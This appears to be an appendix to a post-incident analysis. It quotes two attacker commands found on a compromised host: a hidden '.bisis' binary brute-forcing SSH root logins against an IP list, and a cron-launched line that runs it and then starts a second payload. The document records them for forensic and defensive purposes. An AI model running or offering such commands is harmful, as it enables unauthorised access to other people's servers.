
# Observed Commands

This document contains full versions of commands observed during the post-incident analysis.  
Each command is linked from the findings section for clarity and deeper technical context.

---

## 🧩 .bisis SSH Brute-Force Command
(id: `bisis-ssh-brute-force-command`)

```bash
/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```

**Description:**  
Hidden binary `.bisis` executing SSH brute-force attempts against target systems.  
Uses a timeout of 8 seconds per connection attempt and references an external configuration file (`data.json`).

---

## 🧩 .bisis Cron Persistence Command
(id: `bisis-cron-command`)

```bash
bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulimit -n 999999 ; cat iplist | ./bisis -f 20 -t 8 -T 20 -S 10 -p 22 -l root -o /var/tmp/.update-logs/.history -O /var/tmp/.update-logs/.history -i eth0 -d /var/tmp/.update-logs/iplist2 ; ./x"
```

**Description:**  
Establishes persistence by scheduling `.bisis` brute-force execution via cron.  
Launches `.bisis` with customized parameters (threads, timeout, SSH port, username) and starts a second payload (`x`) after brute-forcing.

---
